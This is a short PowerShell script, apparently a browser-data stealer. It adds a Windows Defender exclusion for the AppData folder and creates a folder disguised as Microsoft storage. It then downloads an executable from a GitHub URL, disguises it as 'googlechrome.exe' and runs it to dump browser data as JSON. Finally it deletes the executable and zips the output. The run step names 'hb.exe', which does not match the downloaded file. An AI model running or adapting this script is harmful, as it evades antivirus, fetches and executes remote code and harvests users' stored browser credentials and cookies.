#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\microsoftstorage"
Set-Location "$env:appdata\Microsoft\microsoftstorage"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "googlechrome.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\microsoftstorage\googlechrome.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath google.zip
$Random = Get-Random
